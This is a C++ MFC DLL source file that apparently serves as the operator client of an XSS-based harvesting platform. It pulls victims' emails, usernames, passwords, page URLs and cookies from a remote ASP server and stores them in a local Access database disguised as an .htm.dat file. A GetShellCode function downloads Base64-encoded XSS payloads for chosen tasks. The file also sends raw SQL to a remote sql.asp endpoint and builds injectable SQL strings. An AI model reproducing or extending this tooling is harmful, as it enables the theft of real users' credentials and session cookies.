// webdata.cpp : Defines the entry point for the DLL application.
//
//define WEBDATA_EXPORTS
#include "stdafx.h"
#include "webdata.h"


#ifdef _DEBUG
#define new DEBUG_NEW //检查内存泄露
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
    switch (ul_reason_for_call)
	{
		case DLL_PROCESS_ATTACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
			break;
    }
    return TRUE;
}



// This is the constructor of a class that has been exported.
// see webdata.h for the class definition
CWebData::CWebData()
{ 
	return; 
}

CWebData::~CWebData()
{ 
	m_strArecv.Empty();
	strxml.Empty();
	return; 
}

int CWebData::login(const CString strSerURL,const CString strLogname,const CString strPassword)
{

	CString strTemp;
	m_strSerURL=strSerURL;//保存URL
	strTemp.Format(_T( "%slogin.asp?username=%s&password=%s"),strSerURL,strLogname,strPassword);
	SendURL(strTemp,1);
	m_strArecv=m_strArecv.Right(10); //提取用户ID,3能取得admin的ID
	int len=m_strArecv.GetLength();
	int n=m_strArecv.Find(':');
	m_strArecv=m_strArecv.Right(len-n-1);
	int nlogID=atoi(m_strArecv);
	if(nlogID<0)
	{
		AfxMessageBox(_T("登录失败！"));
//		logout();
//		logID=0;
		return 0;
	}
	else
	{
		return nlogID;
	}
}

void CWebData::SendURL(CString strurl,bool brecv) //发送ASP请求，并显示获取的数据
{
	CInternetSession mySession(NULL,0);
	CHttpFile* myHttpFile=NULL;
	CString strline;
	CStringA stra;

	strxml.Empty();
	m_strArecv.Empty();
	myHttpFile=(CHttpFile*)mySession.OpenURL(strurl);
	//CString s1=_T("\r\n");
	while(myHttpFile->ReadString(strline))//读取一行
	{

		strline.TrimRight();
		char * cs=(char  *)strline.GetBuffer(strline.GetLength());


		char * rn="\r\n";
		strline.ReleaseBuffer();
		stra.Format("%s%s",cs,rn);
		m_strArecv+=stra;

	}
	
	//写入到文件
	strxml=m_strArecv;//拷贝一份
	myHttpFile->Close() ;
	mySession.Close() ;
	delete myHttpFile;
	if(!brecv) //不需要回显
	{	
//		m_strArecv.Empty();
//		GetDlgItem(IDC_EDWEBSOURCE)->SetWindowText(strxml);
	}

}

//应该用指针或者引用的方法调用
bool CWebData::ReadXML(TCHAR * path,TCHAR * title[15],int len,TCHAR * rss,CListCtrl &m_list)
{
	int nCount = m_list.GetItemCount(); //清空之前的信息

	for (int n=0;n < nCount;n++)
	{
		m_list.DeleteItem(0);
	}

	m_list.DeleteAllItems();

	while ( m_list.DeleteColumn (0));//删除所有的列


	m_list.SetExtendedStyle(LVS_EX_GRIDLINES); //设置扩展风格，重设列
	for (int tit=0;tit<len;tit++)
	{
		m_list.InsertColumn(tit,(LPCTSTR)title[tit],LVCFMT_CENTER,70);
	}
	
    unsigned short buff[128];
    memset(buff,0,128);   

	MSXML::IXMLDOMDocumentPtr xdoc; //
	xdoc.CreateInstance(__uuidof(MSXML::DOMDocument));
//	xdoc->load(path);
	xdoc->loadXML((char *)strxml.GetBuffer(strxml.GetLength()));
	MSXML::IXMLDOMNodeListPtr nodelist=NULL; //获得具体接点的值
	nodelist=xdoc->selectNodes(rss);//读取节点路径
	MSXML::IXMLDOMNodePtr subnode;//节点的指针对象
	long nodecount;
	nodelist->get_length(&nodecount);
	if(!nodecount)
	{
		AfxMessageBox(_T("读取数据文件出错！或没有新信息！")); //表为空
		return 0;
	}
	for(int tit=0;tit<len;tit++) //列
	{	
		for(long i=0;i<nodecount;i++) //行
		{
			if(tit==0) 	m_list.InsertItem(i,_T("")); //等列0的时候要插入一行
			subnode=nodelist->nextNode()->selectSingleNode((_bstr_t)title[tit]);//获得节点的指针对象
			_bstr_t bstrname=subnode->Gettext();//获得内容		
			m_list.SetItemText(i,tit,bstrname);
		}
		nodelist->reset(); 
	}

	return 1;
}

void CWebData::logout(const CString strSerURL,int nlogID)
{
//	GetDlgItem(IDC_EDADDRESS)->GetWindowText(url);
	CString strURLtemp;
	strURLtemp.Format(_T( "%slogout.asp?userID=%d"),strSerURL,nlogID);
	SendURL(strURLtemp,1);

}

void CWebData::CreateXML(TCHAR *path)
{

	CFile file ((LPCTSTR)path,CFile::modeCreate|CFile::modeWrite);
	file.Write(strxml,strxml.GetLength());
	file.Close();
}

void CWebData::SendSql(CString SQL) 
{

	CInternetSession mySession(NULL,0);
	CHttpFile* myHttpFile=NULL;
	CString str1,strline;
	CStringA strsource;

	str1.Format(_T( "%s/sql.asp?sql=%s"),m_strSerURL,SQL );
	myHttpFile=(CHttpFile*)mySession.OpenURL(str1);

	while(myHttpFile->ReadString(strline))//读取一行
	{
		strsource+=strline;
		strsource+="\r\n";
	}
	//写入到文件
	strxml=strsource;//拷贝一份
	myHttpFile->Close();
	mySession.Close();
}


bool CWebData::WebUpToMDB()
{
	//	MessageBoxA(NULL,"全部更新要清空本地数据库？",MB_OKCANCEL);
	if(AfxMessageBox(_T("本操作将先清空本地数据库"), NULL, MB_OKCANCEL)==IDOK)
	{

		if(!LoadXML())
		{
			AfxMessageBox(_T("下载数据出错！"));
			return 0;
		}
		CADOWeb m_cADOwebConn;

		CString sql;
		sql.Format(_T("select * from infcook"));
		m_cADOwebConn.m_pRecordset = m_cADOwebConn.GetRecordSet((_bstr_t)sql);
		if(!m_cADOwebConn.m_pRecordset->adoEOF)
		{
			sql.Format(_T("delete * from infcook"));
			m_cADOwebConn.ExecuteSQL((_bstr_t)sql);
		}
		m_cADOwebConn.ExitConnect();
	}

	TCHAR * path; //xml文件名称
	TCHAR * rss;//xml结构

	TCHAR * form; //数据库表名
	int listnub;

	/////////////////////////////////////////////user.xml
	path=_T("infcook.dat"); //xml文件名称
	rss = _T("rss/channel/item");//xml结构

	form = _T("infcook"); //数据库表名			

	TCHAR *title[8] = //字段
	{
		{_T("webID")},
		{_T("userID")},
		{_T("taskID")},
		{_T("email")},
		{_T("username")},	//
		{_T("password")},
		{_T("urlh")},  //容易导致错误
		{_T("cookies")}
//		{_T("date")}
	};
	
	listnub=sizeof(title)/4;   //字段个数
	if(!WriteXMLtoMDB(path,rss,form,title,listnub))
	{
		AfxMessageBox(_T("存储出错！infcook.xml"));
		return 0;
	}


	AfxMessageBox(_T("数据添加完成！"));
	return 1;
	
}

bool CWebData::WriteXMLtoMDB(TCHAR *path, TCHAR *rss, TCHAR *form,TCHAR * title[15],int listnub)
{

	///////////////////////////////////////////
	//连接XML

	unsigned short buff[128];
    memset(buff,0,128);   

	MSXML::IXMLDOMDocumentPtr xdoc; //
	xdoc.CreateInstance(__uuidof(MSXML::DOMDocument));
//	xdoc->load(path);
	xdoc->loadXML((char *)strxml.GetBuffer(strxml.GetLength()));
	MSXML::IXMLDOMNodeListPtr nodelist=NULL; //获得具体接点的值
	nodelist=xdoc->selectNodes(rss);//读取节点路径
	MSXML::IXMLDOMNodePtr subnode;//节点的指针对象
	long nodecount;
	nodelist->get_length(&nodecount);  //cookies信息太长，导致无法获取正确的nodelist值
	if(!nodecount)
	{
		AfxMessageBox(_T("读取数据文件出错！")); //表为空
		return 0;
	}
//	_bstr_t bstrmdb[50][50];//建立缓冲区
	//初试化数据库存储区
	_bstr_t sql;

	int intID=0;	//获取现在的最大索引intID值
//先写第一竖，记录下第一个插入行的intID,当插入第二列的时候
//
				
	for(int tit=0;tit<listnub;tit++) //--->
	{
		int n=intID;
		for(long i=0;i<nodecount;i++) //向下
		{
			if(tit==0&&i<=1) //写入第一个之后，i=0的时候取的是
			{
				sql="select top 1 ID from "+(_bstr_t)form+" ORDER BY ID DESC"; //TOP最上，ORDER BY ID DESC 小到大
				m_cADOweb.m_pRecordset = m_cADOweb.GetRecordSet(sql);
				if(!m_cADOweb.m_pRecordset->adoEOF)
				{
					_bstr_t  bstrID;
	//				int intID = (int)m_cADOweb.m_pRecordset->GetCollect("ID");  这段代码在VS2005里面用
					bstrID=(_bstr_t)m_cADOweb.m_pRecordset->GetCollect("ID");
					CString strID=(wchar_t*)bstrID;
					if(nodecount==1)
					{
						TCHAR * buffer = strID.GetBuffer(strID.GetLength());
						intID=_ttoi(buffer)+1;//只添加一个数据的时候
					}
					else
					{
						TCHAR * buffer = strID.GetBuffer(strID.GetLength());
						intID=_ttoi(buffer);
					}

				}
				else
				{
		//			AfxMessageBox("ID出错，请确认表名没有错！"); //表为空
					intID=0;
		//			return 0;
				}
			}
			
			subnode=nodelist->nextNode()->selectSingleNode((_bstr_t)title[tit]);//获得节点的指针对象
			_bstr_t bstrname=subnode->Gettext();//获得内容xml
			if(bstrname==(_bstr_t)"") bstrname="0";
		//	bstrmdb[tit][i]=bstrname;			
			if(tit<1) //加入第一列
			{
				sql="INSERT INTO "+(_bstr_t)form+" ("+(_bstr_t)title[tit]+") VALUES('"+ bstrname +"')";
			}
			else 
			{				
				CString temp;
				temp.Format(_T("%d"),n);
				sql="UPDATE "+(_bstr_t)form+" SET "+(_bstr_t)title[tit]+" = '"+ bstrname + "' WHERE ID = "+(_bstr_t)temp;
				n++;
			}
	//			AfxMessageBox(sql);
			m_cADOweb.ExecuteSQL(sql);			
		}		
		nodelist->reset(); 
	}
					
	m_cADOweb.ExitConnect();
	return 1;
}

bool CWebData::LoadXML(int startID)  //下载全部表里的数据
{

	CString strurl;
	strurl.Format(_T( "%s/creatxml.asp?form=infcook"),m_strSerURL );//生成新的XML文件

	SendURL(strurl,0); //不需要回显

	
//	TCHAR * path = _T("infcook.dat");
//	CreateXML(path);


	AfxMessageBox(_T("数据下载完成！"));

	return 1;



}

bool CWebData::GetNews(bool bload) //发送生成XML请求，重新更新到数据库,bload为1则会更新数据
{
		//////////////////////
	//	TCHAR * cook;
		TCHAR * path;
		TCHAR * rss;
		TCHAR * form;
		int listnub;
		CString strurl;
		if(bload==0)
		{
			//		bload = 1;
			strurl.Format(_T("%s/new.asp?download=%d"),m_strSerURL,bload );//生成新的XML文件
			//		AfxMessageBox(strurl);

			SendURL(strurl,1); //需要回显,取得新信息数量
			m_strArecv=m_strArecv.Right(10); //提取用户ID,3能取得admin的ID
			int len=m_strArecv.GetLength();
			int n=m_strArecv.Find(':');
			m_strArecv=m_strArecv.Right(len-n-1);
		//	TCHAR * buffer = m_strArecv.GetBuffer(m_strArecv.GetLength());
		//	news=_ttoi(buffer);
			m_nNews=atoi(m_strArecv);
		}

		else if(bload==1&&m_nNews>0)
		{		
			strurl.Format(_T( "%s/new.asp?download=%d"),m_strSerURL,bload);//读取新的XML文件
			SendURL(strurl,1); //不显示到状态栏

			path = _T("newinfcook.dat");
			CreateXML(path);


			/////////////////////////////////////////////cook.xml
			path=_T("newinfcook.dat"); //xml文件名称
			rss = _T("rss/channel/item");//xml结构

			form = _T("infcook"); //数据库表名			

			TCHAR *titlecook[8] = //字段
			{
				{_T("webID")},
				{_T("userID")},
				{_T("taskID")},
				{_T("email")},
				{_T("username")},	//
				{_T("password")},
				{_T("urlh")},
				{_T("cookies")}
			};

			listnub=sizeof(titlecook)/4;   //字段个数
			if(!WriteXMLtoMDB(path,rss,form,titlecook,listnub))
			{
				AfxMessageBox(_T("COOK存储出错！infcook.xml"));
				return false;
			}
				AfxMessageBox(_T("数据更新完成！"));
				return 1;
		}
		
		//AfxMessageBox(_T("没有新信息！"));
		return 0;

}

  //将内存中xml格式的字串解析出来
bool CWebData::viewinf(CListCtrl &m_list) 
{
	
	
	////////////////////////  inf  /////////////////////////////
	CString strurl;
	strurl.Format(_T( "%s/creatxml.asp?form=inf"),m_strSerURL );//生成新的XML文件
	
	SendURL(strurl,0); //不需要回显
//	strurl.Format(_T( "%s/%dinf.xml"),m_strSerURL,logID);//读取新的XML文件
//	SendURL(strurl,1); //不显示到状态栏
	
	TCHAR * path = _T("inf.dat");
//	CreateXML(path);
	
	////////////////////////////////////
	
	TCHAR *countitl[5] = //将xml的标签付值给这个数组
	{
		{_T("userID")},	//要是换了XML文件，传递一个数组给它就行了
	//	{_T("taskID")},
		{_T("email")},
		{_T("username")},
		{_T("password")},
		{_T("webID")}
	};
	
	int listnub=sizeof(countitl)/4;
	path=_T("inf.dat");
	TCHAR * rss = _T("rss/channel/item");
	ReadXML(path,countitl,listnub,rss,m_list);
	return 1;//要提取这里面的数据，比如

////////////////////// user  /////////////////////////////


}

bool CWebData::viewcook(CListCtrl &m_list,const int nLogID)
{
	CString strurl;
	strurl.Format(_T("%s/creatxml.asp?form=cook"),m_strSerURL );
	SendURL(strurl,1);
//	strurl.Format( _T("%s/%dcook.xml"),m_strSerURL,logID);
//	SendURL(strurl,0);

	TCHAR * path = _T("cook.dat");
//	CreateXML(path);
		
	TCHAR *cooktitl[2] = //将xml的标签付值给这个数组
	{
		{_T("userID")},	//要是换了XML文件，传递一个数组给它就行了
	//	{_T("taskID")},
		{_T("urlh")},
	//	{_T("cookies")},
	};
	
	int listnub=sizeof(cooktitl)/4;
	path=_T("cook.dat");
	TCHAR * rss = _T("rss/channel/item");
//	::ShellExecute(NULL,"open","notepad.exe","cook.xml",NULL,SW_SHOW);
	ReadXML(path,cooktitl,listnub,rss,m_list);
	return 1;

}

bool CWebData::viewuser(CListCtrl &m_list,const int nLogID)
{
	CString strurl;
	strurl.Format(_T("%s/creatxml.asp?form=user"),m_strSerURL );//生成新的XML文件
	SendURL(strurl,0); //不需要回显
	strurl.Format(_T("%s/%duser.xml"),m_strSerURL,nLogID);//读取新的XML文件
	SendURL(strurl,0); //不显示到状态栏
	
	TCHAR * path = _T("user.dat");
	CreateXML(path);
	
	////////////////////////////////////
	
	TCHAR *countitl[3] = //将xml的标签付值给这个数组
	{
		{_T("username")},	//要是换了XML文件，传递一个数组给它就行了
		{_T("userpass")},
		{_T("quanxian")},
	};
	
	int listnub=sizeof(countitl)/4;
	path=_T("user.dat");
	TCHAR * rss = _T("rss/channel/item");
	ReadXML(path,countitl,listnub,rss,m_list);
	return 1;
}

bool CWebData::viewjsweb(CListCtrl &m_list,const int nLogID)
{
	//////////////////
	CString strurl;
	strurl.Format(_T("%s/creatxml.asp?form=jsweb"),m_strSerURL );//生成新的XML文件
	SendURL(strurl,0); //不需要回显
	strurl.Format(_T("%s/%djsweb.xml"),m_strSerURL,nLogID);//读取新的XML文件
	SendURL(strurl,0); //不显示到状态栏
	
	TCHAR * path = _T("jsweb.dat");
	CreateXML(path);
	
	////////////////////////////////////
	
	TCHAR *countitl[3] = //将xml的标签付值给这个数组
	{
		{_T("email")},	//要是换了XML文件，传递一个数组给它就行了
		{_T("jsurl")},
		{_T("m_strSerURL")},
	};
	
	int listnub=sizeof(countitl)/4;
	path=_T("jsweb.dat");
	TCHAR * rss = _T("rss/channel/item");
	ReadXML(path,countitl,listnub,rss,m_list);

	return 1;
}



bool CWebData::delID(TCHAR *form, int ID)
{

	CString strurl;
	strurl.Format(_T( "%s/delID.asp?form=%s&webID=%d"),m_strSerURL,form,ID);//读取新的XML文件
//	AfxMessageBox(strurl);
	SendURL(strurl,0); //不显示到状态栏
	return 1;
}


CStringA CWebData::GetShellCode(const int nTaskID,const TCHAR * pName,const TCHAR * pMailStyle,const int nGetCodeStyle)
{

	//发送获取shellcode请求
	CString strurl;
//	TCHAR*tmail=_T("163.com");
	CString m_email=pName;//+pMailStyle;
	CString Style=pMailStyle;
	m_email=m_email+_T("@")+Style;
	strurl.Format(_T( "%sCode.asp?s_mail=%s&UserName=%s&PassWord=%s&nTask=%d&nHKStyle=%d"),m_strSerURL,m_email,_T("admin"),_T("admin"),nTaskID,nGetCodeStyle);//读取新的XML文件
//	AfxMessageBox(strurl);
	SendURL(strurl,1); //不显示到状态栏
	
	string str1(m_strArecv.GetString());

	//string str1 = cstr1.GetBuffer(cstr1.GetLength());
//	MessageBox((LPCTSTR)str1.c_str());
	string str2 = Base64::base64_decode(str1);
//	MessageBox((LPCTSTR)str2.c_str());
	CStringA STR_XSS;
//	STR_XSS=str2;
	STR_XSS.Format("%s",str2.c_str());
	return STR_XSS;
}


bool CWebData::viewinfformMDB(CListCtrl &m_list,const int nLogID)
{
	int nCount = m_list.GetItemCount(); //清空之前的信息

	for (int n=0;n < nCount;n++)
	{
		m_list.DeleteItem(0);
	}
	m_list.DeleteAllItems();
	while ( m_list.DeleteColumn (0));//删除所有的列
	TCHAR *countitl[6] = //将xml的标签付值给这个数组
	{
		{_T("webID")},
		{_T("userID")},	//要是换了XML文件，传递一个数组给它就行了
		{_T("taskID")},
		{_T("email")},
		{_T("username")},
		{_T("password")}
		
	};
	int listnub=sizeof(countitl)/4;
	m_list.SetExtendedStyle(LVS_EX_GRIDLINES); //设置扩展风格，重设列
	for (int tit=0;tit<listnub;tit++)
	{
		m_list.InsertColumn(tit,(LPCTSTR)countitl[tit],LVCFMT_CENTER,70);
	}


	CADOWeb m_cADOwebConn;
	if(!m_cADOwebConn.OnInitADOConnect())
		return 0;
		CString sql;
		int i = 0;
		sql.Format(_T("select  * from infcook order by webID DESC")); //ASC 默认，DESC大到小
		m_cADOwebConn.m_pRecordset = m_cADOwebConn.GetRecordSet((_bstr_t)sql);
		while(!m_cADOwebConn.m_pRecordset->adoEOF)
		{
			m_list.InsertItem(i,_T("")); //如果数据库中有空怎么办？
			m_list.SetItemText(i,0,(LPCTSTR)(_bstr_t)m_cADOwebConn.m_pRecordset->GetCollect("webID"));
			m_list.SetItemText(i,1,(LPCTSTR)(_bstr_t)m_cADOwebConn.m_pRecordset->GetCollect("userID"));
			m_list.SetItemText(i,2,(LPCTSTR)(_bstr_t)m_cADOwebConn.m_pRecordset->GetCollect("taskID"));
			m_list.SetItemText(i,3,(LPCTSTR)(_bstr_t)m_cADOwebConn.m_pRecordset->GetCollect("email"));
			m_list.SetItemText(i,4,(LPCTSTR)(_bstr_t)m_cADOwebConn.m_pRecordset->GetCollect("username"));
			m_list.SetItemText(i,5,(LPCTSTR)(_bstr_t)m_cADOwebConn.m_pRecordset->GetCollect("password"));
			m_cADOwebConn.m_pRecordset->MoveNext();
			i++;
		}
		m_cADOwebConn.ExitConnect();
		return true;
}

bool CWebData::viewcookformMDB(CListCtrl &m_list,const int nLogID)
{
	int nCount = m_list.GetItemCount(); //清空之前的信息

	for (int n=0;n < nCount;n++)
	{
		m_list.DeleteItem(0);
	}

	m_list.DeleteAllItems();

	while ( m_list.DeleteColumn (0));//删除所有的列

	TCHAR *cooktitl[4] = //将xml的标签付值给这个数组
	{
		{_T("webID")},
		{_T("userID")},	//要是换了XML文件，传递一个数组给它就行了
		{_T("taskID")},
		{_T("urlh")},
	};
	
	int listnub=sizeof(cooktitl)/4;
	m_list.SetExtendedStyle(LVS_EX_GRIDLINES); //设置扩展风格，重设列
	for (int tit=0;tit<listnub;tit++)
	{
		m_list.InsertColumn(tit,(LPCTSTR)cooktitl[tit],LVCFMT_CENTER,70);
	}
	CADOWeb m_cADOwebConn;
	if(!m_cADOwebConn.OnInitADOConnect())
		return 0;
	
		CString sql;
		int i = 0;
		sql.Format(_T("select  * from infcook order by webID DESC")); //ASC 默认，DESC大到小
		m_cADOwebConn.m_pRecordset = m_cADOwebConn.GetRecordSet((_bstr_t)sql);
		while(!m_cADOwebConn.m_pRecordset->adoEOF)
		{
			m_list.InsertItem(i,_T("")); //如果数据库中有空怎么办？
			m_list.SetItemText(i,0,(LPCTSTR)(_bstr_t)m_cADOwebConn.m_pRecordset->GetCollect("webID"));
			m_list.SetItemText(i,1,(LPCTSTR)(_bstr_t)m_cADOwebConn.m_pRecordset->GetCollect("userID"));
			m_list.SetItemText(i,2,(LPCTSTR)(_bstr_t)m_cADOwebConn.m_pRecordset->GetCollect("taskID"));
			m_list.SetItemText(i,3,(LPCTSTR)(_bstr_t)m_cADOwebConn.m_pRecordset->GetCollect("urlh"));
			//		m_list.SetItemText(i,4,(char*)(_bstr_t)m_cADOwebConn.m_pRecordset->GetCollect("date"));
			//		m_list.SetItemText(i,3,(char*)(_bstr_t)m_cADOwebConn.m_pRecordset->GetCollect("cookies"));
			m_cADOwebConn.m_pRecordset->MoveNext();
			i++;
		}
	   m_cADOwebConn.ExitConnect();
	return true;
}

std::string Base64::base64_encode(unsigned char const* bytes_to_encode, unsigned int in_len) {
    std::string ret;
    int i = 0;
    int j = 0;
    unsigned char char_array_3[3];
    unsigned char char_array_4[4];
    /*把每三个8Bit的字节转换为四个6Bit的字节（3*8 = 4*6 = 24），然后把6Bit再添两位高位0，组成四个8Bit的字节*/
    while (in_len--) {
        char_array_3[i++] = *(bytes_to_encode++);
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2; //按位与运算，* 0xfc=11111100 清空末两位，再向右移两位
			//0x03=000011取末两位，左移四位，加上3[1]的前四位，0xf0=11110000
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
			//0x0f=00001111去3[1]的后四位，左移两位，加上3[2]的左边两为 oxc0=110000
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
			//0x3f=00111111 取右边六位
            char_array_4[3] = char_array_3[2] & 0x3f;
            
            for(i = 0; (i <4) ; i++)
                ret += base64_chars[char_array_4[i]];
            i = 0;
        }
    }
    
    if (i)
    {
        for(j = i; j < 3; j++)
            char_array_3[j] = '0';
        
        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
        char_array_4[3] = char_array_3[2] & 0x3f;
        
        for (j = 0; (j < i + 1); j++)
            ret += base64_chars[char_array_4[j]];
        
        while((i++ < 3))
            ret += '=';
        
    }
    
    return ret;
}

std::string Base64::base64_decode(std::string const& encoded_string) {
    int in_len = encoded_string.size();
    int i = 0;
    int j = 0;
    int in_ = 0;
    unsigned char char_array_4[4], char_array_3[3];
    std::string ret;
    
    while (in_len-- && ( encoded_string[in_] != '=') && is_base64(encoded_string[in_])) {
        char_array_4[i++] = encoded_string[in_]; in_++;
        if (i ==4) {
            for (i = 0; i <4; i++)
                char_array_4[i] = base64_chars.find(char_array_4[i]);
            
            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
            
            for (i = 0; (i < 3); i++)
                ret += char_array_3[i];
            i = 0;
        }
    }
    
    if (i) {
        for (j = i; j <4; j++)
            char_array_4[j] = 0;
        
        for (j = 0; j <4; j++)
            char_array_4[j] = base64_chars.find(char_array_4[j]);
        
        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
        
        for (j = 0; (j < i - 1); j++) ret += char_array_3[j];
    }
    
    return ret;
}


			// MFC support for Windows Common Controls



//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CADOWeb::CADOWeb()
{

}

CADOWeb::~CADOWeb()
{
	::CoUninitialize();
}


bool CADOWeb::OnInitADOConnect() //初始化连接
{
	//初始话OLE/COM库环境
	//初始化OLE/COM库环境
	TCHAR *mdbpath;
	TCHAR	inipath[MAX_PATH];

	ZeroMemory( inipath ,MAX_PATH*sizeof(TCHAR));
	GetModuleFileName(NULL, inipath, MAX_PATH);
	//GetCurrentDirectory(MAX_PATH,inipath);  //找到当前进程的当前目录
	TCHAR *pFind = _tcsrchr(inipath, _T('\\'));
	if ( pFind != NULL)
	{
		lstrcpy(pFind, _T("\\"));
	}

	lstrcat(inipath,_T("#mage_men_stars1.htm.dat"));
	mdbpath = inipath;

//	mdbpath="#mage_men_stars1.htm.mdb";
    ::CoInitialize(NULL);
	try
	{
		//创建connection对象
		m_pConnection.CreateInstance("ADODB.Connection");	   
		//设置连接字符串
		_bstr_t strConnect="uid=;pwd=;DRIVER={Microsoft Access Driver (*.mdb)};DBQ="+(_bstr_t)mdbpath+";";
		//SERVER和UID,PWD的设置根据实际情况来设置
		m_pConnection->Open(strConnect,"","",adModeUnknown);
		return true;
	}

	//捕捉异常
	catch(_com_error e)
	{   //显示错误信息
//		AfxMessageBox(e.Description());
		AfxMessageBox(_T("数据库连接出错"));
		return false;
	
	}

}

_RecordsetPtr& CADOWeb::GetRecordSet(_bstr_t bstrSQL) //SQL命令 
{
	try
	{
		m_pConnection==NULL;
			OnInitADOConnect();
			
				//创建记录集对象
				//		m_pRecordset->CreateInstance; //记录集智能指针对象
				m_pRecordset.CreateInstance(__uuidof(Recordset));
				m_pRecordset->Open(bstrSQL,m_pConnection.GetInterfacePtr(), //直接用记录集对象查询
				adOpenDynamic,adLockOptimistic,adCmdText);
				
			
	}
	catch(_com_error e)
	{
		AfxMessageBox(e.Description());
	}
	return m_pRecordset;
}

bool CADOWeb::ExecuteSQL(_bstr_t bstrSQL) //无记录集返回执行SQL命令
{
	try
	{
		if(m_pConnection==NULL)
			OnInitADOConnect();
			
				m_pConnection->Execute(bstrSQL,NULL,adCmdText);
				return true;
			
	}

	catch(_com_error e)
	{
		AfxMessageBox(e.Description());
		return false;
	}

}

void CADOWeb::ExitConnect() //断开连接
{
	if(m_pRecordset!=NULL)
		m_pRecordset->Close();
	m_pConnection->Close();

}


